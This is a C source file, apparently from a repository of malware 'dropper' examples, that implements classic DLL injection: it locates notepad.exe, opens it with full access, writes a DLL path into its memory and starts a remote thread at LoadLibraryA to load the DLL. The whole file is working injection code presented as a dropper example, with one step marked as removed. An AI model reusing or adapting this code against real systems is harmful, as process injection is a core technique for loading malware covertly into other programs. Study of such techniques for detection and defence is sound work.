/**
 * @file examples/pe/ex6.c
 * @author adamr88 (adamr88@github.com)
 * @brief Classic DLL injection
 * @version 0.1
 * @date 2024-01-04
 *
 * @copyright Copyright (c) 2024
 *
 */

#ifdef _WIN32
#include <windows.h>
#pragma comment(lib, "user32.lib")
#pragma comment(linker, "/subsystem:windows")
#else
#include <stub/tlhelp32.h>
#include <stub/windows.h>
#endif

#include <dropper/assert.h>
#include <dropper/enc.h>
#include <dropper/proc.h>

enum { MAX_TIMEOUT = 4294967295, PID_ERR = -2 };

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine,
            int nShowCmd) {
  const char procname[] = "notepad.exe";

  // consider alternative to hardcoded service path
  const unsigned char dllPath[] = "Z:\\droppers\\examples\\DllDropperEx1.dll";
  const size_t dllPathLen = 38;

  // find target process
  int pid = PID_ERR;
  Assert((pid = LookupProcessID(procname, PID_ERR)) != PID_ERR);

  // find function address for LoadLibrary
  HMODULE k32 = GetModuleHandle("kernel32.dll");
  LPTHREAD_START_ROUTINE pLoadLibraryA =
      (LPTHREAD_START_ROUTINE)GetProcAddress(k32, "LoadLibraryA");
  AssertNotNull(k32, GetModuleHandle, -1 * __LINE__);

  // note: PROCESS_ALL_ACCESS
  void *hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
  AssertNotNull(hProc, OpenProcess, -1 * __LINE__);

  // allocate REMOTE virtual memory buf
  void *lpbuf =
      VirtualAllocEx(hProc, NULL, dllPathLen, MEM_COMMIT, PAGE_EXECUTE_READ);
  AssertNotNull(lpbuf, VirtualAllocEx, -1 * __LINE__);

  // copy dllPath to virtual memory buf
  Assert(WriteProcessMemory(hProc, lpbuf, (PVOID)dllPath, (SIZE_T)dllPathLen,
                            (SIZE_T *)NULL));

  // change virtual memory buf execution permissions
  // ... <removed> ...

  // execute dll path (in REMOTE thread/subprocess)
  HANDLE th = CreateRemoteThread(hProc, NULL, 0, pLoadLibraryA, lpbuf, 0, NULL);
  AssertNotNull(th, CreateRemoteThread, -1 * __LINE__);

  // clean up threads and memory
  WaitForSingleObject(th, 0); // '-1'
  Assert(CloseHandle(th));
  Assert(CloseHandle(hProc));
  Assert(VirtualFree(lpbuf, dllPathLen, MEM_RELEASE));
  return 0;
}

#ifndef _WIN32
int main() {
  WinMain((NULL), (NULL), (NULL), -1);
  return 0;
}
#endif

/**
 * @note
 * See examples/pe/ex3.c for payload creation details
 *
 */